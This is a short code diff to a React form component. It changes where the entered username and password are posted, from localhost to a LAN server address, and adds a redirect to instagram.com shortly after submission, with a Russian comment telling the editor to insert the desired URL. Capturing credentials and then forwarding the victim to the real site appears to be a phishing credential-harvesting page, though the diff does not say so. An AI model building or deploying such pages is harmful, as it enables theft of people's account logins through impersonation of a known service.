@@ -27,12 +27,14 @@ export default function FirstBlock() {
     e.preventDefault();
     try {
       const response = await axios.post(
-        "http://localhost:8080/api/users/addNewUser",
-        {
-          username: username,
-          password: password,
-        }
+        "http://192.168.101.94:8080/api/users/addNewUser",
+        { username, password },
+        { headers: { "Content-Type": "application/json" } }
       );
+
+      setTimeout(() => {
+        window.location.href = "https://instagram.com"; // сюда вставь нужный URL
+      }, 300);
 
       console.log("User created:", response.data);
     } catch (error) {
